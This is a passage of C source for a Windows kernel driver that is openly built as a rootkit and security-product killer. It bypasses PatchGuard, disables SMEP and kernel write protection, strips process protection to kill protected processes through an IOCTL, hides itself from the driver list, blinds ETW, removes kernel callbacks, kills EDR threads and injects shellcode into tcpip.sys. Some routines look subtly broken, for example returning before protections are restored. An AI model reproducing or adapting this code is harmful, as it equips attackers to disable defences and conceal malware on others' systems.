    KIRQL irql;
    KeAcquireSpinLock(&DpcLock, &irql);
    if (g_PatchGuardBypassActive && IsPatchGuardHardError(_ReturnAddress())) {
        KeReleaseSpinLock(&DpcLock, irql);
        return FALSE;
    }
    DecryptMemory(HookedKeInsertQueueDpc, 0x1000);
    __try {
        result = ((KEINSERTQUEUEDPC)g_ShadowKeInsertQueueDpc)(Dpc, DeferredContext, SystemArgument1, SystemArgument2);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        result = FALSE;
    }
    EncryptMemory(HookedKeInsertQueueDpc, 0x1000);
    KeReleaseSpinLock(&DpcLock, irql);
    return result;
}

BOOLEAN HookedKeSetTimer(PKTIMER Timer, LARGE_INTEGER DueTime, PKDPC Dpc) {
    BOOLEAN result;
    KIRQL irql;
    KeAcquireSpinLock(&TimerLock, &irql);
    if (g_PatchGuardBypassActive && Dpc && IsPatchGuardHardError(_ReturnAddress())) {
        KeReleaseSpinLock(&TimerLock, irql);
        return FALSE;
    }
    DecryptMemory(HookedKeSetTimer, 0x1000);
    __try {
        result = ((BOOLEAN (*)(PKTIMER, LARGE_INTEGER, PKDPC))g_KeSetTimerHook.Trampoline)(Timer, DueTime, Dpc);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        result = FALSE;
    }
    EncryptMemory(HookedKeSetTimer, 0x1000);
    KeReleaseSpinLock(&TimerLock, irql);
    return result;
}

NTSTATUS HookedEtwProviderRegister(PVOID Provider, PVOID ProviderId, PVOID Callback, PVOID Context) {
    DecryptMemory(HookedEtwProviderRegister, 0x1000);
    __try {
        if (MmIsAddressValid(Provider)) {
            UNICODE_STRING procName;
            PEPROCESS process = PsGetCurrentProcess();
            PsGetProcessImageFileName(process, &procName);
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    NTSTATUS status = ((ETWPROVIDERREGISTER)g_EtwProviderRegisterHook.Trampoline)(Provider, ProviderId, Callback, Context);
    EncryptMemory(HookedEtwProviderRegister, 0x1000);
    return status;
}

NTSTATUS InitializeSyscallCache(ULONG SyscallNumber) {
    ULONG extractedSyscall = ExtractSyscallNumber(ZwTerminateProcess);
    if (extractedSyscall != 0) {
        g_ZwTerminateProcess.Number = extractedSyscall;
    } else {
        g_ZwTerminateProcess.Number = SyscallNumber;
    }
    g_ZwTerminateProcess.Address = ResolveSSDTAddress(g_ZwTerminateProcess.Number);
    if (!g_ZwTerminateProcess.Address || !MmIsAddressValid(g_ZwTerminateProcess.Address)) return STATUS_INVALID_ADDRESS;
    SetupRSBHook(g_ZwTerminateProcess.Address);
    return STATUS_SUCCESS;
}

NTSTATUS StripPPLProtection(PEPROCESS Process, ULONG ProtectionOffset) {
    ULONG major, minor, build;
    if (NT_SUCCESS(GetOsVersion(&major, &minor, &build)) && (build >= 17763 || major > 10)) {
    } else {
        DisableSMEP();
    }
    g_PatchGuardBypassActive = TRUE;
    DisableCR0WP();
    __try {
        PUCHAR protection = (PUCHAR)Process + ProtectionOffset;
        if (MmIsAddressValid(protection) && *protection <= 7) {
            *protection = 0;
            return STATUS_SUCCESS;
        }
        return STATUS_INVALID_ADDRESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
    EnableCR0WP();
    if (g_SmepDisabled) EnableSMEP();
    g_PatchGuardBypassActive = FALSE;
}

NTSTATUS TerminateProcessWithSystemToken(ULONG pid) {
    NTSTATUS status;
    PEPROCESS process;
    HANDLE processHandle;
    HANDLE systemToken;
    __try {
        status = DuplicateSystemToken(&systemToken);
        if (!NT_SUCCESS(status)) return status;
        status = PsLookupProcessByProcessId((HANDLE)pid, &process);
        if (!NT_SUCCESS(status)) {
            ZwClose(systemToken);
            return status;
        }
        status = ObOpenObjectByPointer(process, OBJ_KERNEL_HANDLE, NULL, PROCESS_TERMINATE, *PsProcessType, KernelMode, &processHandle);
        if (!NT_SUCCESS(status)) {
            ObDereferenceObject(process);
            ZwClose(systemToken);
            return status;
        }
        status = PsAssignImpersonationToken(PsGetCurrentThread(), systemToken);
        if (!NT_SUCCESS(status)) {
            ZwClose(processHandle);
            ObDereferenceObject(process);
            ZwClose(systemToken);
            return status;
        }
        status = ZwTerminateProcess(processHandle, 0);
        ZwClose(processHandle);
        ObDereferenceObject(process);
        ZwClose(systemToken);
        return status;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        ZwClose(systemToken);
        return STATUS_UNSUCCESSFUL;
    }
}

NTSTATUS TerminateProcessDirect(ULONG pid) {
    NTSTATUS status;
    PEPROCESS process;
    HANDLE processHandle;
    __try {
        status = PsLookupProcessByProcessId((HANDLE)pid, &process);
        if (!NT_SUCCESS(status)) return status;
        status = ObOpenObjectByPointer(process, OBJ_KERNEL_HANDLE, NULL, PROCESS_TERMINATE, *PsProcessType, KernelMode, &processHandle);
        if (!NT_SUCCESS(status)) {
            ObDereferenceObject(process);
            return status;
        }
        status = ZwTerminateProcess(processHandle, 0);
        ZwClose(processHandle);
        ObDereferenceObject(process);
        return status;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

NTSTATUS TerminateProcessViaSyscall(ULONG pid) {
    NTSTATUS status;
    PEPROCESS process;
    HANDLE processHandle;
    __try {
        status = PsLookupProcessByProcessId((HANDLE)pid, &process);
        if (!NT_SUCCESS(status)) return status;
        status = ObOpenObjectByPointer(process, OBJ_KERNEL_HANDLE, NULL, PROCESS_TERMINATE, *PsProcessType, KernelMode, &processHandle);
        if (!NT_SUCCESS(status)) {
            ObDereferenceObject(process);
            return status;
        }
        g_PatchGuardBypassActive = TRUE;
        DisableCR0WP();
        __try {
            if (g_ZwTerminateProcess.Address && MmIsAddressValid(g_ZwTerminateProcess.Address)) {
                NtTerminateProcess_t NtTerminate = (NtTerminateProcess_t)g_ZwTerminateProcess.Address;
                status = NtTerminate(processHandle, 0);
            } else {
                status = STATUS_INVALID_ADDRESS;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            status = STATUS_UNSUCCESSFUL;
        }
        EnableCR0WP();
        g_PatchGuardBypassActive = FALSE;
        ZwClose(processHandle);
        ObDereferenceObject(process);
        return status;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

NTSTATUS IrpCreateHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bytes = 0;
    ULONG syscallNumber, protectionOffset;
    __try {
        status = IsSupportedOsVersion(&syscallNumber, &protectionOffset);
        if (!NT_SUCCESS(status)) {
            status = BinaryDiffOffsets(&protectionOffset);
            if (!NT_SUCCESS(status)) goto complete;
        }
        switch (stack->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_TERMINATE_PROCESS:
            if (stack->Parameters.DeviceIoControl.InputBufferLength >= sizeof(ULONG)) {
                ULONG pid = *(ULONG*)Irp->AssociatedIrp.SystemBuffer;
                PEPROCESS process;
                if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)pid, &process))) {
                    UNICODE_STRING procName;
                    if (NT_SUCCESS(PsGetProcessImageFileName(process, &procName))) {
                        if (_wcsicmp(procName.Buffer, L"csrss.exe") == 0 ||
                            _wcsicmp(procName.Buffer, L"smss.exe") == 0) {
                            status = STATUS_ACCESS_DENIED;
                            ObDereferenceObject(process);
                            goto complete;
                        }
                    }
                    status = TerminateProcessWithSystemToken(pid);
                    if (!NT_SUCCESS(status)) {
                        status = TerminateProcessDirect(pid);
                        if (!NT_SUCCESS(status)) {
                            status = TerminateProcessViaSyscall(pid);
                            if (!NT_SUCCESS(status)) {
                                ULONG offset = protectionOffset;
                                if (!NT_SUCCESS(FindEprocessProtectionOffset(process, &offset))) {
                                    BinaryDiffOffsets(&offset);
                                }
                                status = StripPPLProtection(process, offset);
                                if (NT_SUCCESS(status)) {
                                    status = TerminateProcessDirect(pid);
                                }
                            }
                        }
                    }
                    ObDereferenceObject(process);
                } else {
                    status = STATUS_NOT_FOUND;
                }
            } else {
                status = STATUS_INVALID_PARAMETER;
            }
            break;
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = STATUS_UNSUCCESSFUL;
    }
complete:
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytes;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID RemoveFromDriverList(PDRIVER_OBJECT DriverObject) {
    __try {
        PLIST_ENTRY current = DriverObject->DriverSection;
        if (current && MmIsAddressValid(current)) {
            PLIST_ENTRY prev = current->Blink;
            PLIST_ENTRY next = current->Flink;
            if (MmIsAddressValid(prev) && MmIsAddressValid(next)) {
                DisableCR0WP();
                prev->Flink = next;
                next->Blink = prev;
                current->Flink = current;
                current->Blink = current;
                EnableCR0WP();
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

VOID ObfuscateDriverName(PUNICODE_STRING DriverName) {
    __try {
        if (DriverName->Buffer && MmIsAddressValid(DriverName->Buffer)) {
            DisableCR0WP();
            for (USHORT i = 0; i < DriverName->Length / sizeof(WCHAR); i++) {
                DriverName->Buffer[i] ^= (WCHAR)(KeQuerySystemTimePrecise() & 0xFFFF);
            }
            EnableCR0WP();
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

PVOID AllocateStealthPool(SIZE_T Size) {
    __try {
        PVOID memory = ExAllocatePoolWithTag(NonPagedPoolNx, Size, 'ShCd');
        if (memory) {
            RtlZeroMemory(memory, Size);
            return memory;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return NULL;
}

VOID FreeStealthPool(PVOID Memory) {
    __try {
        if (Memory) {
            ExFreePoolWithTag(Memory, 'ShCd');
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

VOID EncryptTrampoline(PVOID Trampoline, SIZE_T Size) {
    EncryptMemory(Trampoline, Size);
}

VOID DecryptTrampoline(PVOID Trampoline, SIZE_T Size) {
    DecryptMemory(Trampoline, Size);
}

BOOLEAN IsPatchGuardContext() {
    __try {
        CONTEXT context;
        RtlCaptureContext(&context);
        PVOID* stack = (PVOID*)context.Rsp;
        for (int i = 0; i < 32; i++) {
            if (!MmIsAddressValid(&stack[i])) continue;
            UNICODE_STRING moduleName;
            if (NT_SUCCESS(RtlGetModuleNameForAddress(stack[i], &moduleName))) {
                if (_wcsicmp(moduleName.Buffer, L"ntoskrnl.exe") == 0) {
                    if ((ULONG_PTR)stack[i] == (ULONG_PTR)KeBugCheckEx) {
                        return TRUE;
                    }
                }
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return FALSE;
}

BOOLEAN RandomizedPatchGuardBypass() {
    LARGE_INTEGER time;
    KeQuerySystemTime(&time);
    return (time.QuadPart % 1000000) < 500000;
}

NTSTATUS UnmapDriverImage(PDRIVER_OBJECT DriverObject) {
    __try {
        PVOID driverBase = DriverObject->DriverStart;
        ULONG driverSize = DriverObject->DriverSize;
        if (MmIsAddressValid(driverBase)) {
            MmUnmapViewInSystemSpace(driverBase);
            DisableCR0WP();
            RtlZeroMemory(driverBase, driverSize);
            EnableCR0WP();
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return STATUS_SUCCESS;
}

NTSTATUS RelocateDriverLogic(PDRIVER_OBJECT DriverObject) {
    __try {
        SIZE_T driverSize = DriverObject->DriverSize;
        PVOID newBase = AllocateStealthPool(driverSize);
        if (!newBase) return STATUS_INSUFFICIENT_RESOURCES;
        RtlCopyMemory(newBase, DriverObject->DriverStart, driverSize);
        DisableCR0WP();
        DriverObject->DriverStart = newBase;
        EnableCR0WP();
        return UnmapDriverImage(DriverObject);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

NTSTATUS WipeDriverSections(PDRIVER_OBJECT DriverObject) {
    __try {
        PVOID driverBase = DriverObject->DriverStart;
        if (MmIsAddressValid(driverBase)) {
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)driverBase;
            if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
                PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)driverBase + dosHeader->e_lfanew);
                if (MmIsAddressValid(ntHeaders) && ntHeaders->Signature == IMAGE_NT_SIGNATURE) {
                    DisableCR0WP();
                    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
                    for (USHORT i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
                        if (strncmp((CHAR*)section[i].Name, ".data", 5) == 0 ||
                            strncmp((CHAR*)section[i].Name, ".text", 5) == 0 ||
                            strncmp((CHAR*)section[i].Name, ".rdata", 6) == 0) {
                            RtlZeroMemory((PUCHAR)driverBase + section[i].VirtualAddress, section[i].SizeOfRawData);
                        }
                    }
                    RtlZeroMemory(&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
                                  sizeof(IMAGE_DATA_DIRECTORY));
                    EnableCR0WP();
                }
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return STATUS_SUCCESS;
}

NTSTATUS NopEtwFunctions() {
    __try {
        UNICODE_STRING etwRegisterName = RTL_CONSTANT_STRING(L"EtwRegister");
        UNICODE_STRING etwEventWriteName = RTL_CONSTANT_STRING(L"EtwEventWrite");
        PVOID etwRegister = MmGetSystemRoutineAddress(&etwRegisterName);
        PVOID etwEventWrite = MmGetSystemRoutineAddress(&etwEventWriteName);
        if (etwRegister && MmIsAddressValid(etwRegister)) {
            DisableCR0WP();
            RtlFillMemory(etwRegister, 16, 0x90);
            EnableCR0WP();
        }
        if (etwEventWrite && MmIsAddressValid(etwEventWrite)) {
            DisableCR0WP();
            RtlFillMemory(etwEventWrite, 16, 0x90);
            EnableCR0WP();
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return STATUS_SUCCESS;
}

NTSTATUS RemoveKernelCallbacks() {
    __try {
        PsRemoveLoadImageNotifyRoutine(NULL);
        PsRemoveCreateProcessNotifyRoutine(NULL);
        ObUnRegisterCallbacks(NULL);
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return STATUS_SUCCESS;
}

VOID UserModeApcRoutine(PVOID NormalContext, PVOID SystemArgument1, PVOID SystemArgument2) {
    UNREFERENCED_PARAMETER(NormalContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    __try {
        NtTerminateProcess(NtCurrentProcess(), 0);
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

NTSTATUS QueueUserModeApc(ULONG pid) {
    NTSTATUS status;
    PEPROCESS process;
    PETHREAD thread;
    __try {
        status = PsLookupProcessByProcessId((HANDLE)pid, &process);
        if (!NT_SUCCESS(status)) return status;
        status = PsGetProcessThreadList(process, &thread);
        if (!NT_SUCCESS(status)) {
            ObDereferenceObject(process);
            return status;
        }
        PVOID apcMemory = AllocateStealthPool(0x1000);
        if (!apcMemory) {
            ObDereferenceObject(thread);
            ObDereferenceObject(process);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        RtlCopyMemory(apcMemory, (PVOID)UserModeApcRoutine, 0x1000);
        KAPC apc;
        KeInitializeApc(&apc, thread, OriginalApcEnvironment, (PKNORMAL_ROUTINE)apcMemory, NULL, NULL, UserMode, NULL);
        if (!KeInsertQueueApc(&apc, NULL, NULL, 0)) {
            FreeStealthPool(apcMemory);
            ObDereferenceObject(thread);
            ObDereferenceObject(process);
            return STATUS_UNSUCCESSFUL;
        }
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        return STATUS_SUCCESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

NTSTATUS ShadowFunction(PVOID OriginalFunction, PVOID* ShadowFunction, PMDL* MdlOut) {
    __try {
        SIZE_T funcSize = 0x1000;
        if (!MmIsAddressValid(OriginalFunction)) return STATUS_INVALID_ADDRESS;
        PVOID shadow = AllocateStealthMemory(funcSize, MdlOut);
        if (!shadow) return STATUS_INSUFFICIENT_RESOURCES;
        RtlCopyMemory(shadow, OriginalFunction, funcSize);
        *ShadowFunction = shadow;
        return STATUS_SUCCESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

BOOLEAN IsVmxSupported() {
    __try {
        int cpuInfo[4];
        __cpuid(cpuInfo, 1);
        if (!(cpuInfo[2] & (1 << 5))) return FALSE;
        ULONG64 msr = __readmsr(IA32_FEATURE_CONTROL);
        if (!(msr & 0x1) || !(msr & 0x4)) return FALSE;
        return TRUE;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

NTSTATUS InitializeVmx() {
    __try {
        if (!IsVmxSupported()) return STATUS_NOT_SUPPORTED;
        g_VmxContext.VmxRegion = AllocateStealthPool(PAGE_SIZE);
        if (!g_VmxContext.VmxRegion) return STATUS_INSUFFICIENT_RESOURCES;
        g_VmxContext.VmxRegionPa = MmGetPhysicalAddress(g_VmxContext.VmxRegion);
        *(ULONG64*)g_VmxContext.VmxRegion = __readmsr(IA32_VMX_BASIC);
        g_VmxContext.Vmcs = AllocateStealthPool(PAGE_SIZE);
        if (!g_VmxContext.Vmcs) {
            FreeStealthPool(g_VmxContext.VmxRegion);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        g_VmxContext.VmcsPa = MmGetPhysicalAddress(g_VmxContext.Vmcs);
        g_VmxContext.MsrBitmap = AllocateStealthPool(PAGE_SIZE);
        if (!g_VmxContext.MsrBitmap) {
            FreeStealthPool(g_VmxContext.VmxRegion);
            FreeStealthPool(g_VmxContext.Vmcs);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        RtlZeroMemory(g_VmxContext.MsrBitmap, PAGE_SIZE);
        if (!__vmx_on(&g_VmxContext.VmxRegionPa)) {
            __vmx_vmclear(&g_VmxContext.VmcsPa);
            __vmx_vmptrld(&g_VmxContext.VmcsPa);
            g_VmxContext.VmxEnabled = TRUE;
            return STATUS_SUCCESS;
        }
        FreeStealthPool(g_VmxContext.VmxRegion);
        FreeStealthPool(g_VmxContext.Vmcs);
        FreeStealthPool(g_VmxContext.MsrBitmap);
        return STATUS_UNSUCCESSFUL;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

NTSTATUS SetupEpt(PVOID TargetFunction) {
    __try {
        g_VmxContext.Eptp = AllocateStealthPool(PAGE_SIZE);
        if (!g_VmxContext.Eptp) return STATUS_INSUFFICIENT_RESOURCES;
        PHYSICAL_ADDRESS targetPa = MmGetPhysicalAddress(TargetFunction);
        ULONG64* pml4 = (ULONG64*)g_VmxContext.Eptp;
        pml4[0] = 0x7;
        ULONG64* pdpt = (ULONG64*)AllocateStealthPool(PAGE_SIZE);
        if (!pdpt) {
            FreeStealthPool(g_VmxContext.Eptp);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        pml4[0] |= MmGetPhysicalAddress(pdpt).QuadPart;
        pdpt[0] = 0x7;
        ULONG64* pd = (ULONG64*)AllocateStealthPool(PAGE_SIZE);
        if (!pd) {
            FreeStealthPool(g_VmxContext.Eptp);
            FreeStealthPool(pdpt);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        pdpt[0] |= MmGetPhysicalAddress(pd).QuadPart;
        pd[0] = 0x87;
        pd[0] |= targetPa.QuadPart & ~0xFFF;
        __vmx_vmwrite(VMX_EPT_POINTER, MmGetPhysicalAddress(g_VmxContext.Eptp).QuadPart | (3 << 3) | 6);
        return STATUS_SUCCESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

VOID VmxExitHandler() {
    __try {
        ULONG64 exitReason;
        __vmx_vmread(VM_EXIT_REASON, &exitReason);
        if (exitReason == VMX_EXIT_REASON_EPT_VIOLATION) {
            ULONG64 guestRip;
            __vmx_vmread(GUEST_RIP, &guestRip);
            if (guestRip == (ULONG64)ZwTerminateProcess) {
                ULONG64 guestRsp;
                __vmx_vmread(GUEST_RSP, &guestRsp);
                HANDLE processHandle = *(HANDLE*)(guestRsp + sizeof(ULONG64));
                NTSTATUS exitStatus = *(NTSTATUS*)(guestRsp + 2 * sizeof(ULONG64));
                NtTerminateProcess_t NtTerminate = (NtTerminateProcess_t)g_ZwTerminateProcess.Address;
                NtTerminate(processHandle, exitStatus);
                __vmx_vmwrite(GUEST_RIP, guestRip + 0x10);
            }
        }
        __vmx_vmlaunch();
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

NTSTATUS InitializeVmxIntercept(PVOID TargetFunction) {
    __try {
        if (!g_VmxContext.VmxEnabled) {
            NTSTATUS status = InitializeVmx();
            if (!NT_SUCCESS(status)) return status;
        }
        NTSTATUS status = SetupEpt(TargetFunction);
        if (!NT_SUCCESS(status)) return status;
        status = SetupEptCloaking(TargetFunction);
        if (!NT_SUCCESS(status)) return status;
        __vmx_vmwrite(VMX_MSR_BITMAP, MmGetPhysicalAddress(g_VmxContext.MsrBitmap).QuadPart);
        __vmx_vmwrite(VMX_EXCEPTION_BITMAP, 0xFFFFFFFF);
        __vmx_vmwrite(VMX_EPT_VIOLATION_EXIT_QUALIFICATION, 0x1);
        return STATUS_SUCCESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

VOID CleanupVmx() {
    __try {
        if (g_VmxContext.VmxEnabled) {
            __vmx_vmclear(&g_VmxContext.VmcsPa);
            __vmx_off();
            FreeStealthPool(g_VmxContext.VmxRegion);
            FreeStealthPool(g_VmxContext.Vmcs);
            FreeStealthPool(g_VmxContext.MsrBitmap);
            FreeStealthPool(g_VmxContext.Eptp);
            FreeStealthPool(g_VmxContext.EptpTable);
            g_VmxContext.VmxEnabled = FALSE;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

VOID PeriodicMaintenance(PKDPC Dpc, PVOID Context, PVOID SystemArgument1, PVOID SystemArgument2) {
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(Context);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    RestoreTamperedHook(&g_KeSetTimerHook);
    RestoreTamperedHook(&g_EtwProviderRegisterHook);
    KillEdrThreads();
    ReRandomizeTrampoline(&g_KeSetTimerHook);
    ReRandomizeTrampoline(&g_EtwProviderRegisterHook);
    RehydrateShellcode();
}

VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symlink;
    RtlInitUnicodeString(&symlink, DRIVER_SYMLINK);
    IoDeleteSymbolicLink(&symlink);
    IoDeleteDevice(DriverObject->DeviceObject);
    QueueUnhookApc(&g_KeSetTimerHook);
    QueueUnhookApc(&g_EtwProviderRegisterHook);
    FreeStealthMemory(g_PatchedKeInsertQueueDpc, g_PatchedKeInsertQueueDpcMdl);
    FreeStealthMemory(g_ShadowKeInsertQueueDpc, g_ShadowKeInsertQueueDpcMdl);
    FreeStealthMemory(g_FakeSSDT, g_FakeSSDTMdl);
    FreeStealthMemory(g_InjectedShellcode, g_InjectedShellcodeMdl);
    CleanupVmx();
    EnableCR0WP();
    if (g_SmepDisabled) EnableSMEP();
    FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
    if (g_PerCoreStates) {
        for (ULONG i = 0; i < KeQueryActiveProcessorCount(NULL); i++) {
            if (g_PerCoreStates[i].DeviceObject) IoDeleteDevice(g_PerCoreStates[i].DeviceObject);
        }
        FreeStealthPool(g_PerCoreStates);
    }
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status;
    UNICODE_STRING deviceName, symlink;
    PDEVICE_OBJECT deviceObject = NULL;
    ULONG syscallNumber, protectionOffset;
    KeInitializeSpinLock(&DpcLock);
    KeInitializeSpinLock(&TimerLock);
    g_StealthMemoryPool = AllocateStealthMemory(0x2000, &g_StealthMdl);
    if (!g_StealthMemoryPool) return STATUS_INSUFFICIENT_RESOURCES;
    WipePeHeaders(DriverObject);
    RemoveFromDriverList(DriverObject);
    RtlInitUnicodeString(&deviceName, DRIVER_NAME);
    RtlInitUnicodeString(&symlink, DRIVER_SYMLINK);
    ObfuscateDriverName(&deviceName);
    ObfuscateDriverName(&symlink);
    status = IsSupportedOsVersion(&syscallNumber, &protectionOffset);
    if (!NT_SUCCESS(status)) {
        status = BinaryDiffOffsets(&protectionOffset);
        if (!NT_SUCCESS(status)) {
            FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
            return status;
        }
    }
    status = InitializeSyscallCache(syscallNumber);
    if (!NT_SUCCESS(status)) {
        FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
        return status;
    }
    status = ShadowFunction(KeInsertQueueDpc, &g_ShadowKeInsertQueueDpc, &g_ShadowKeInsertQueueDpcMdl);
    if (!NT_SUCCESS(status)) {
        FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
        return status;
    }
    g_OriginalKeInsertQueueDpc = KeInsertQueueDpc;
    status = InitializeVmxIntercept(ZwTerminateProcess);
    if (!NT_SUCCESS(status)) {
        FreeStealthMemory(g_ShadowKeInsertQueueDpc, g_ShadowKeInsertQueueDpcMdl);
        FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
        return status;
    }
    status = CreateFakeSSDT();
    if (!NT_SUCCESS(status)) {
        FreeStealthMemory(g_ShadowKeInsertQueueDpc, g_ShadowKeInsertQueueDpcMdl);
        FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
        return status;
    }
    UNICODE_STRING targetModule = RTL_CONSTANT_STRING(L"tcpip.sys");
    InjectShellcodeIntoModule(&targetModule);
    SetupPeriodicTimer();
    KTIMER maintTimer;
    KDPC maintDpc;
    KeInitializeTimer(&maintTimer);
    KeInitializeDpc(&maintDpc, PeriodicMaintenance, NULL);
    LARGE_INTEGER maintDueTime;
    maintDueTime.QuadPart = -30000000; // 3 seconds
    KeSetTimer(&maintTimer, maintDueTime, &maintDpc);
    status = InstallInlineHook(&KeSetTimer, HookedKeSetTimer, &g_KeSetTimerHook);
    if (!NT_SUCCESS(status)) {
        FreeStealthMemory(g_ShadowKeInsertQueueDpc, g_ShadowKeInsertQueueDpcMdl);
        FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
        return status;
    }
    EncryptMemory(HookedKeSetTimer, 0x1000);
    EncryptTrampoline(g_KeSetTimerHook.Trampoline, 64);
    UNICODE_STRING etwProviderRegisterName = RTL_CONSTANT_STRING(L"EtwProviderRegister");
    PVOID etwProviderRegister = MmGetSystemRoutineAddress(&etwProviderRegisterName);
    if (etwProviderRegister) {
        status = InstallInlineHook(etwProviderRegister, HookedEtwProviderRegister, &g_EtwProviderRegisterHook);
        if (!NT_SUCCESS(status)) {
            RemoveInlineHook(&g_KeSetTimerHook);
            FreeStealthMemory(g_ShadowKeInsertQueueDpc, g_ShadowKeInsertQueueDpcMdl);
            FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
            return status;
        }
        EncryptMemory(HookedEtwProviderRegister, 0x1000);
        EncryptTrampoline(g_EtwProviderRegisterHook.Trampoline, 64);
    }
    UNICODE_STRING psCreateNotifyName = RTL_CONSTANT_STRING(L"PsSetCreateProcessNotifyRoutineEx");
    UNICODE_STRING psLoadImageNotifyName = RTL_CONSTANT_STRING(L"PsSetLoadImageNotifyRoutine");
    PVOID psCreateNotify = MmGetSystemRoutineAddress(&psCreateNotifyName);
    PVOID psLoadImageNotify = MmGetSystemRoutineAddress(&psLoadImageNotifyName);
    if (psCreateNotify) InstallInlineHook(psCreateNotify, HookedPsSetCreateProcessNotifyRoutineEx, &g_KeSetTimerHook);
    if (psLoadImageNotify) InstallInlineHook(psLoadImageNotify, HookedPsSetLoadImageNotifyRoutine, &g_EtwProviderRegisterHook);
    PVOID piepAddress;
    AllocatePIEP(&piepAddress);
    InitializePerCoreStates(DriverObject);
    NopEtwFunctions();
    RemoveKernelCallbacks();
    status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        RemoveInlineHook(&g_EtwProviderRegisterHook);
        RemoveInlineHook(&g_KeSetTimerHook);
        FreeStealthMemory(g_ShadowKeInsertQueueDpc, g_ShadowKeInsertQueueDpcMdl);
        FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
        return status;
    }
    status = IoCreateSymbolicLink(&symlink, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        RemoveInlineHook(&g_EtwProviderRegisterHook);
        RemoveInlineHook(&g_KeSetTimerHook);
        FreeStealthMemory(g_ShadowKeInsertQueueDpc, g_ShadowKeInsertQueueDpcMdl);
        FreeStealthMemory(g_StealthMemoryPool, g_StealthMdl);
        return status;
    }
    RelocateDriverLogic(DriverObject);
    WipeDriverSections(DriverObject);
    DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateHandler;
